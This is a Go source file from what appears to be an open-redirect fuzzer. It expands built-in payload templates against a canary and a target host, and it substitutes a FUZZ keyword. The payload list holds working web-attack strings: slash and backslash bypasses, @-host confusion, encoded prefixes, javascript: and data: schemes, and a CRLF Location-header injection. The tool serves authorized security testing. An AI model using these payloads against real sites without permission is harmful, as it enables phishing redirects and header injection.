// Package payload expands built-in open-redirect templates against a canary
// and a target host, and substitutes a FUZZ keyword in operator-supplied input.
package payload

import (
	"strings"
)

const (
	// DefaultKeyword is the OpenRedireX-style injection mark.
	DefaultKeyword = "FUZZ"

	tokenCanary = "{{canary}}"
	tokenTarget = "{{target}}"

	mechQuery  = "query"
	mechCRLF   = "crlf"
	mechHeader = "header"

	techA03 = "OR-A03"
	techA07 = "OR-A07"
	techB04 = "OR-B04"
)

// Payload is one technique-tagged template.
type Payload struct {
	Technique string
	Template  string
	Mechanism string
}

// Expand replaces canary and target tokens in p.Template.
func Expand(p Payload, canary, target string) string {
	out := strings.ReplaceAll(p.Template, tokenCanary, canary)
	out = strings.ReplaceAll(out, tokenTarget, target)

	return out
}

// Substitute replaces keyword with value. An empty keyword is a no-op.
func Substitute(raw, keyword, value string) string {
	if keyword == "" {
		return raw
	}

	return strings.ReplaceAll(raw, keyword, value)
}

// HasKeyword reports whether raw contains the injection mark.
func HasKeyword(raw, keyword string) bool {
	return keyword != "" && strings.Contains(raw, keyword)
}

// BuiltIn is the offline payload set used when PortSwigger data is absent.
func BuiltIn() []Payload {
	out := make([]Payload, len(builtIn))
	copy(out, builtIn)

	return out
}

var builtIn = []Payload{
	{Technique: techA07, Mechanism: mechQuery, Template: "https://" + tokenCanary},
	{Technique: techA07, Mechanism: mechQuery, Template: "//" + tokenCanary},
	{Technique: techA07, Mechanism: mechQuery, Template: "///" + tokenCanary},
	{Technique: techA07, Mechanism: mechQuery, Template: "////" + tokenCanary},
	{Technique: techA03, Mechanism: mechQuery, Template: "/\\" + tokenCanary},
	{Technique: techA03, Mechanism: mechQuery, Template: "\\/\\/" + tokenCanary},
	{Technique: techA03, Mechanism: mechQuery, Template: "https:/\\" + tokenCanary},
	{Technique: techA03, Mechanism: mechQuery, Template: "/\\/" + tokenCanary},
	{Technique: "OR-A01", Mechanism: mechQuery, Template: "https://" + tokenTarget + "@" + tokenCanary},
	{Technique: "OR-A01", Mechanism: mechQuery, Template: "https://" + tokenTarget + "%40" + tokenCanary},
	{Technique: "OR-A08", Mechanism: mechQuery, Template: "https://" + tokenCanary + "/" + tokenTarget},
	{Technique: "OR-A09", Mechanism: mechQuery, Template: "https://" + tokenTarget + "." + tokenCanary},
	{Technique: "OR-A08", Mechanism: mechQuery, Template: "https://" + tokenCanary + "?" + tokenTarget},
	{Technique: "OR-A08", Mechanism: mechQuery, Template: "https://" + tokenCanary + "#" + tokenTarget},
	{Technique: "OR-A06", Mechanism: mechQuery, Template: "%09//" + tokenCanary},
	{Technique: "OR-A12", Mechanism: mechQuery, Template: "%00//" + tokenCanary},
	{Technique: "OR-A06", Mechanism: mechQuery, Template: "%20//" + tokenCanary},
	{Technique: "OR-A05", Mechanism: mechQuery, Template: "https://" + tokenTarget + "\u3002" + tokenCanary},
	{Technique: "OR-A14", Mechanism: mechQuery, Template: "https:" + tokenCanary},
	{Technique: "OR-A14", Mechanism: mechQuery, Template: "https;" + tokenCanary},
	{Technique: "OR-A14", Mechanism: mechQuery, Template: "https:\\/\\/" + tokenCanary},
	{Technique: "OR-E01", Mechanism: mechQuery, Template: "javascript:" + tokenCanary},
	{Technique: "OR-E02", Mechanism: mechQuery, Template: "data:text/html," + tokenCanary},
	{Technique: "OR-E03", Mechanism: mechQuery, Template: "http://" + tokenTarget + "/"},
	{Technique: techB04, Mechanism: mechQuery, Template: "https%3A%2F%2F" + tokenCanary},
	{Technique: techB04, Mechanism: mechQuery, Template: "%2F%2F" + tokenCanary},
	{Technique: "OR-A11", Mechanism: mechCRLF, Template: "/%0d%0aLocation:%20https://" + tokenCanary},
	{Technique: "OR-D01", Mechanism: mechHeader, Template: tokenCanary},
}
